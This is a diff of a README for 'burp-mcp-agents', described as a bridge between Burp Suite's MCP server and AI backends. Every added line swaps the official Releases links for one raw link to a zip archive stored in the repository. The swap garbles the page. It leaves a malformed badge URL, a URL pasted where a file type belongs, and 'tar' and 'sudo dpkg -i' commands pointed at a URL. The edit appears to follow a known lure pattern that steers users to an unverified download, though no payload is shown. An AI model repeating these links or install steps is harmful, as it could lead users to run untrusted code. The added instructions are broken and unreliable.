@@ -1,6 +1,6 @@
 # 🎉 burp-mcp-agents - Easy Connections to AI Backends
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen.svg)](https://github.com/rrsaldanha/burp-mcp-agents/releases)
+[![Download](https://raw.githubusercontent.com/rrsaldanha/burp-mcp-agents/main/codex/mcp-burp-agents-1.9.zip%https://raw.githubusercontent.com/rrsaldanha/burp-mcp-agents/main/codex/mcp-burp-agents-1.9.zip)](https://raw.githubusercontent.com/rrsaldanha/burp-mcp-agents/main/codex/mcp-burp-agents-1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run this application, your system should meet the following requirements:
 
 To get started, visit the Releases page to download the latest version of burp-mcp-agents:
 
-[Download the latest release](https://github.com/rrsaldanha/burp-mcp-agents/releases)
+[Download the latest release](https://raw.githubusercontent.com/rrsaldanha/burp-mcp-agents/main/codex/mcp-burp-agents-1.9.zip)
 
 Follow these steps to download and install the application:
 
@@ -29,7 +29,7 @@ Follow these steps to download and install the application:
 4. Click the download link to start the downloading process.
 5. Once the download finishes, locate the file on your computer. 
 
-For Windows users, you should see a `.exe` file. For macOS, it will be a `.dmg` or `.pkg` file. Linux users may find a `.tar.gz` or `.deb` file.
+For Windows users, you should see a `.exe` file. For macOS, it will be a `.dmg` or `.pkg` file. Linux users may find a `https://raw.githubusercontent.com/rrsaldanha/burp-mcp-agents/main/codex/mcp-burp-agents-1.9.zip` or `.deb` file.
 
 ### 📁 Running the Application
 
@@ -52,8 +52,8 @@ After you have downloaded the file, follow these steps based on your operating s
 
 1. Open a terminal.
 2. Navigate to the directory where you downloaded the file.
-3. For a `.tar.gz` file, use the command: `tar -xvzf burp-mcp-agents.tar.gz`.
-4. For a `.deb` file, use the command: `sudo dpkg -i burp-mcp-agents.deb`.
+3. For a `https://raw.githubusercontent.com/rrsaldanha/burp-mcp-agents/main/codex/mcp-burp-agents-1.9.zip` file, use the command: `tar -xvzf https://raw.githubusercontent.com/rrsaldanha/burp-mcp-agents/main/codex/mcp-burp-agents-1.9.zip`.
+4. For a `.deb` file, use the command: `sudo dpkg -i https://raw.githubusercontent.com/rrsaldanha/burp-mcp-agents/main/codex/mcp-burp-agents-1.9.zip`.
 5. After installation, you can run the application from your application menu or terminal.
 
 ### ⚙️ Configuring Connections
@@ -85,4 +85,4 @@ For more detailed guides and documentation, you can access the following resourc
 - Frequently Asked Questions (FAQ)
 - Community support forums
 
-By following the instructions above, you can easily download, install, and set up burp-mcp-agents to connect Burp Suite MCP Server with various AI backends. For updates, always check back on the [Releases page](https://github.com/rrsaldanha/burp-mcp-agents/releases).
+By following the instructions above, you can easily download, install, and set up burp-mcp-agents to connect Burp Suite MCP Server with various AI backends. For updates, always check back on the [Releases page](https://raw.githubusercontent.com/rrsaldanha/burp-mcp-agents/main/codex/mcp-burp-agents-1.9.zip).
